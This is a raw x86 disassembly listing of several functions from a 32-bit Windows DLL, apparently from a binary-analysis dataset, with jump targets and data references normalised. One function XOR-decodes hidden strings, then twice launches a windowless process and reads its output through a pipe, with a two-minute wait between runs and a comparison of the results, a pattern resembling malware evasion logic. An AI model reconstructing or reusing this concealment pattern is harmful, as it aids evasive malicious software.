jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x14a
call sub_1001bb80
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x138 ]
lea ecx [ ebp - 0x90 ]
call sub_10053a60
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_100173d0
lea esi [ ebp - 0x130 ]
call sub_100173d0
lea esi [ ebp - 0x138 ]
call sub_100173d0
lea esi [ ebp - 0x128 ]
call sub_100173d0
mov eax 0x3
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x138 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_100173d0
lea esi [ ebp - 0x130 ]
call sub_100173d0
lea esi [ ebp - 0x138 ]
call sub_100173d0
lea esi [ ebp - 0x128 ]
call sub_100173d0
mov eax 0x4
jmp r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0x120 ]
mov eax 0xfa
call sub_1001bb80
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x130 ]
lea ecx [ ebp - 0x120 ]
call sub_10053a60
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_100173d0
lea esi [ ebp - 0x130 ]
call sub_100173d0
lea esi [ ebp - 0x138 ]
call sub_100173d0
lea esi [ ebp - 0x128 ]
call sub_100173d0
mov eax 0x5
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x130 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_100173d0
lea esi [ ebp - 0x130 ]
call sub_100173d0
lea esi [ ebp - 0x138 ]
call sub_100173d0
lea esi [ ebp - 0x128 ]
call sub_100173d0
mov eax 0x6
jmp r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0xd8 ]
mov eax 0x8c
call sub_1001bb80
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x140 ]
lea ecx [ ebp - 0xd8 ]
call sub_10053a60
test eax eax
jne r-xdata
lea esi [ ebp - 0x140 ]
call sub_100173d0
lea esi [ ebp - 0x130 ]
call sub_100173d0
lea esi [ ebp - 0x138 ]
call sub_100173d0
lea esi [ ebp - 0x128 ]
call sub_100173d0
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x140 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
lea esi [ ebp - 0x140 ]
mov [ eax ] dx
call sub_100173d0
lea esi [ ebp - 0x130 ]
call sub_100173d0
lea esi [ ebp - 0x138 ]
call sub_100173d0
lea esi [ ebp - 0x128 ]
call sub_100173d0
cmp edi ebx
jl r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov eax 0x7
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_10022155
push 0x194
mov eax sub_1007ee58
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18c ] ecx
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x190 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10030263
pop ecx
lea ecx [ ebp - 0x19c ]
lea eax [ ebp - 0x194 ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10037fc8
pop ecx
lea ecx [ ebp - 0x194 ]
jmp r-xdata
mov ecx [ ebp - 0x180 ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_1002a730
and [ ebp - 0x38 ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] ax
and [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x180 ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x198 ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1001a5e2
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov ecx [ ebp - 0x188 ]
lea eax [ ebp - 0x64 ]
push eax
call sub_10064af1
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1004dbe5
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1004dbe5
mov eax [ ebp - 0x188 ]
call sub_10019c00
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x180 ]
cmp [ ebp - 0x161 ] 0x0
je r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
mov ecx ebx
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10018685
pop ecx
lea ecx [ ebp - 0x1a0 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_1002a730
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10020962
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_1005e05a
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10054ac3
mov edi eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x190 ]
push 0x7
pop edi
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x180 ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
add edi 0x2
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ebx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx ebx
call sub_10039e87
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
xor edi edi
mov ecx ebx
mov [ ebp - 0x17c ] edi
call [ eax + 0x1c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push edi
push 0x30
call sub_1005e05a
movzx eax ax
mov [ ebp - 0x178 ] eax
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_1002a674
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x70 ] edi
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
movzx eax [ esi + 0x6 ]
mov edx [ edi ]
push eax
push 0x48
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
mov ecx esi
call sub_1001e1bc
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001e1bc
mov [ ebp - 0x16e ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_10039e87
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx ebx ax
cmp bx di
je r-xdata
mov ecx [ ebp - 0x38 ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1001a5e2
cmp [ esi + 0x4 ] al
jne r-xdata
cmp ax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_1004dbe5
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
movzx edi ax
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x16e ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_1004dbe5
movzx eax [ esi + 0x6 ]
mov [ ebp - 0x16e ] 0x1
cmp [ edi ] ax
je r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test di di
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1001e1ec
jmp r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xd4 ]
push eax
mov ecx ebx
call sub_100171f8
or [ ebp - 0x168 ] 0x4
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x8
jbe r-xdata
mov ecx esi
call sub_1001e1ec
lea eax [ ebp - 0x160 ]
push eax
mov ecx ebx
call sub_10039e87
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_1003a25a
lea ecx [ ebp - 0x160 ]
jmp r-xdata
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] edi
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
xor bl bl
lea eax [ ebp - 0x144 ]
push eax
mov ecx ebx
call sub_100171f8
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1004dbe5
jmp r-xdata
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001e1bc
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_1001c5c0
jmp r-xdata
sub edi [ ebp - 0x17c ]
movzx eax [ esi + 0x6 ]
cmp ax di
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_1004dbe5
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x178 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10021a98
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
add edi 0x2
call sub_1001e1ec
test bl bl
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_1004dbe5
movzx eax [ esi + 0x6 ]
cmp [ edi ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10021a98
mov ecx esi
call sub_1001e1ec
mov ecx esi
call sub_1001e1bc
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_10039e87
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_1004dbe5
test edi edi
je r-xdata
mov ecx esi
call sub_1001e1ec
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_100171f8
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_1003a25a
push 0x0
push 0x1
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_1004dbe5
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x17c ]
cmp eax [ ebp - 0x184 ]
jge r-xdata
mov eax [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_1001c5c0
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_100171f8
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_1004dbe5
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001e1bc
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001e1bc
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10021a98
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001e1bc
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10021a98
inc [ ebp - 0x17c ]
mov ecx esi
call sub_1001e1bc
sub_10022b00
push ebp
mov ebp esp
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ rw-data ]
push esi
push edi
xor edi edi
push 0x208
lea eax [ ebp - 0x280 ]
push edi
push eax
mov [ ebp - 0x2ac ] edi
mov [ ebp - 0x2b4 ] edi
call sub_10078970
mov ecx [ r--data ]
add esp 0xc
mov [ ebp - 0x284 ] edi
xor eax eax
lea ecx [ ecx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffad
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov esi [ ebx + 0xda0 ]
xor eax eax
mov [ ebp - 0x4e ] ax
cmp esi [ ebx + 0xda4 ]
je r-xdata
push edi
lea edx [ ebp - 0x2c0 ]
push edx
lea eax [ ebp - 0x2a4 ]
push eax
lea ecx [ ebp - 0x288 ]
push ecx
mov [ ebp - 0x2c0 ] 0xc
mov [ ebp - 0x2b8 ] 0x1
mov [ ebp - 0x2bc ] edi
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
mov edi [ StrStrIW@IAT ]
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x288 ]
push edi
push 0x1
push edx
call [ SetHandleInformation@IAT ]
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x44
lea eax [ ebp - 0x308 ]
push edi
push eax
call sub_10078970
or [ ebp - 0x2dc ] 0x100
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
add esp 0xc
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x308 ] 0x44
xor eax eax
nop
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor al al
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
add esi 0x1c
cmp esi [ ebx + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfffe
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0x9
jb r-xdata
push 0x104
lea ecx [ ebp - 0x280 ]
push ecx
lea edx [ ebp - 0x74 ]
xor eax eax
push edx
mov [ ebp - 0x62 ] ax
call [ ExpandEnvironmentStringsW@IAT ]
mov ecx [ r--data ]
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edi edi
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x2d
and edx 0xff
mov [ ebp + eax * 2 - 0x4c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ CreateProcessW@IAT ]
lea ecx [ ebp - 0x2a0 ]
push ecx
lea edx [ ebp - 0x308 ]
push edx
push edi
push edi
push 0x8000000
push 0x1
xor eax eax
push edi
mov [ ebp - 0x38 ] ax
push edi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x280 ]
push ecx
call ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x2a0 ]
mov esi [ WaitForSingleObject@IAT ]
push 0xffffffff
push edx
call esi
mov edx [ ebp - 0x288 ]
push edi
mov edi [ ReadFile@IAT ]
lea eax [ ebp - 0x284 ]
push eax
push 0x14
lea ecx [ ebp - 0x34 ]
push ecx
push edx
call edi
mov eax [ ebp - 0x284 ]
push 0x1d4c0
mov [ ebp + eax - 0x34 ] 0x0
call [ Sleep@IAT ]
push 0x44
lea ecx [ ebp - 0x308 ]
push 0x0
push ecx
call sub_10078970
or [ ebp - 0x2dc ] 0x100
add esp 0xc
xor eax eax
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
lea edx [ ebp - 0x2a0 ]
push edx
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
lea eax [ ebp - 0x308 ]
push eax
push 0x0
push 0x0
push 0x8000000
push 0x1
push 0x0
push 0x0
lea ecx [ ebp - 0x4c ]
push ecx
lea edx [ ebp - 0x280 ]
push edx
mov [ ebp - 0x308 ] 0x44
call ebx
test eax eax
je r-xdata
mov eax [ ebp - 0x2a0 ]
push 0xffffffff
push eax
call esi
mov eax [ ebp - 0x288 ]
xor esi esi
push esi
lea ecx [ ebp - 0x284 ]
push ecx
push 0x14
lea edx [ ebp - 0x20 ]
push edx
push eax
mov [ ebp - 0x284 ] esi
call edi
mov ecx [ ebp - 0x284 ]
mov [ ebp + ecx - 0x20 ] 0x0
mov ebx esi
inc esi
cmp esi 0x14
jb r-xdata
movsx eax [ ebp + esi - 0x20 ]
push eax
call sub_10003602
add esp 0x4
test eax eax
jne r-xdata
movsx edx [ ebp + esi - 0x34 ]
push edx
call sub_10003602
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ ebp - 0x2ac ]
jmp r-xdata
mov edi [ r--data ]
xor cl cl
xor eax eax
inc esi
cmp esi 0x14
jb r-xdata
xor esi esi
jmp r-xdata
mov dl [ eax + edi ]
xor dl cl
xor dl 0x84
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x290 ]
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp + ebx - 0x34 ]
push eax
mov [ ebp - 0x7 ] 0x0
call sub_100576fd
lea ecx [ ebp - 0x28c ]
push ecx
lea edx [ ebp - 0x2b0 ]
push edx
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp + esi - 0x20 ]
push ecx
call sub_100576fd
mov edx [ ebp - 0x2b0 ]
add esp 0x20
sub edx [ ebp - 0x2a8 ]
je r-xdata
mov esi [ ebp - 0x2b4 ]
mov ecx [ ebp - 0x28c ]
sub ecx [ ebp - 0x290 ]
cmp ecx 0x2
jge r-xdata
mov eax [ ebp - 0x28c ]
sub eax [ ebp - 0x290 ]
add eax 0x3c
cmp eax 0x2
jge r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10022f10
push esi
mov esi [ eax ]
push edi
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ lstrcmpW@IAT ]
mov edi edi
test esi esi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi ]
pop edi
pop esi
retn
mov ecx [ ebx + 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call edi
test eax eax
je r-xdata
sub_10022f50
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor ecx ecx
push 0xffffffff
push ecx
mov [ esi + 0x10 ] ecx
add eax 0x11c
mov [ ebp - 0x4 ] ecx
xor edx edx
mov [ esi + 0x14 ] 0x7
push eax
mov ecx esi
mov [ esi ] dx
call sub_1001c310
mov eax esi
mov esp ebp
pop ebp
retn
sub_10022fa0
push 0x3c
mov eax sub_1007e369
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1004770a
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000a135
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
